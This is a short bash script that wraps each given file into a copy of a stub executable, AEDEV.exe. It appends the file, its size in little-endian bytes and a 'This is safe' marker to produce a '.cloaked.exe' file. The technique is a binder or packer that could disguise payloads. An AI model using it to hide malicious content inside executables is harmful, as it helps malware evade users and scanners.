littleEndian() {
  cur=""
  res=""
  count=0
  while [[ $cur != "$1" ]]; do
      bts=$(echo "$1" | grep -Po "[\da-f]{1,2}(?=$cur\b)")
      cur="$bts$cur"
      res="$res\x$bts"
      count=$((count+1))
  done
  while [[ $count -lt 4 ]]; do
    res="$res\x0"
    count=$((count+1))
  done
  echo "$res"
}
embed() {
  for f in $1; do
    listing=$(ls "$f" -l)
    sizeDeci=$(echo "$listing" | grep -Po '\d+(?=\s+\w{3}\s+\d{1,2})')
    sizeHex=$(printf '%x\n' $sizeDeci)
    sizeLEHex=$(littleEndian $sizeHex)
    cp AEDEV.exe "$f.cloaked.exe"
    cat "$f" >> "$f.cloaked.exe"
    echo -en "$sizeLEHex""This is safe\0" >> "$f.cloaked.exe"
  done;
}